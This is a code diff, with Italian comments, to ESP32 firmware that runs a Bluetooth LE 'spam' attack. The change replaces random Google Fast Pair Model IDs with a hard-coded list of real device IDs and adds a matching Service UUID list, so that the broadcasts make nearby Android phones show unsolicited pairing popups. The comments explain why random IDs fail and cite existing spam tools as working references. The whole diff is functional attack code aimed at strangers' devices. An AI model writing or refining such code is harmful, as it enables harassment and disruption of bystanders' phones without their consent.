@@ -32,6 +32,8 @@ static EventGroupHandle_t s_evt = NULL;
 static volatile bool      s_running = false;
 static ble_spam_type_t    s_spam_type = BLE_SPAM_APPLE;
 
+static const ble_uuid16_t s_fast_pair_uuid = BLE_UUID16_INIT(0xFE2C);
+
 typedef enum {
     BLE_SPAM_VENDOR_APPLE = 0,
     BLE_SPAM_VENDOR_SAMSUNG,
@@ -144,18 +146,32 @@ static size_t build_microsoft_payload(uint8_t *buf, size_t max_len)
     return 5 + name_len;
 }
 
-/* Google Fast Pair: non e' manufacturer data ma Service Data sull'UUID
- * 0xFE2C (AD type 0x16). Un Model ID non registrato su Google mostra
- * comunque il prompt Fast Pair generico ("dispositivo Bluetooth"), solo
- * senza nome/immagine dedicati -- per la scheda "ricca" serve un Model ID
- * pubblico vero, prendilo da un vero device o dalla documentazione Fast Pair. */
+/* Google Fast Pair: Service Data sull'UUID 0xFE2C (AD type 0x16). A
+ * differenza di Apple/Microsoft il popup NON si basa su byte "strutturali"
+ * decisi localmente dal telefono: il Model ID e' una chiave di lookup nel
+ * registro dispositivi di Google (cache locale in Play Services + verifica
+ * cloud). Un Model ID casuale/non registrato non risolve a nessun device
+ * e Android scarta il pacchetto in silenzio -- nessun popup, nessun errore.
+ * Serve quindi il Model ID VERO di un dispositivo Fast Pair reale, esattamente
+ * come fanno i tool di riferimento (CapibaraZero/FastPairSpam, i BLE spam
+ * per Flipper Zero di Willy-JL/Spooks4576): niente ID casuali o "debug". */
+static const uint8_t s_google_model_ids[][3] = {
+    { 0x92, 0xBB, 0xBD },   /* Pixel Buds */
+    { 0x82, 0x1F, 0x66 },   /* JBL Flip 6 */
+    { 0xF5, 0x24, 0x94 },   /* JBL Buds Pro */
+    { 0x71, 0x8F, 0xA4 },   /* JBL Live 300TWS */
+    { 0xCD, 0x82, 0x56 },   /* Bose NC 700 */
+};
+
 static size_t build_google_svc_data(uint8_t *buf, size_t max_len)
 {
+    int idx = esp_random() % (sizeof(s_google_model_ids) / sizeof(s_google_model_ids[0]));
+
     buf[0] = 0x2C;   /* UUID 0xFE2C, little-endian */
     buf[1] = 0xFE;
-    buf[2] = (uint8_t)esp_random();   /* Model ID, 3 byte -- placeholder non registrato */
-    buf[3] = (uint8_t)esp_random();
-    buf[4] = (uint8_t)esp_random();
+    buf[2] = s_google_model_ids[idx][0];
+    buf[3] = s_google_model_ids[idx][1];
+    buf[4] = s_google_model_ids[idx][2];
     return 5;
 }
 
@@ -200,6 +216,12 @@ static void send_one_burst(void)
             len = build_google_svc_data(payload, sizeof(payload));
             fields.svc_data_uuid16 = payload;
             fields.svc_data_uuid16_len = len;
+            /* Le implementazioni note funzionanti (CapibaraZero/FastPairSpam,
+             * i BLE spam per Flipper) accompagnano il Service Data con una
+             * Service UUID List (AD 0x03) sulla stessa UUID -- replichiamola. */
+            fields.uuids16 = &s_fast_pair_uuid;
+            fields.num_uuids16 = 1;
+            fields.uuids16_is_complete = 1;
             break;
         default:
             return;
@@ -304,6 +326,7 @@ esp_err_t ble_spam_stop(void)
         ESP_LOGW(TAG, "ble_spam_task non ha confermato l'uscita entro il timeout");
         return ESP_ERR_TIMEOUT;
     }
+    ESP_LOGI(TAG, "BLE spam stopped");
     return ESP_OK;
 }
 
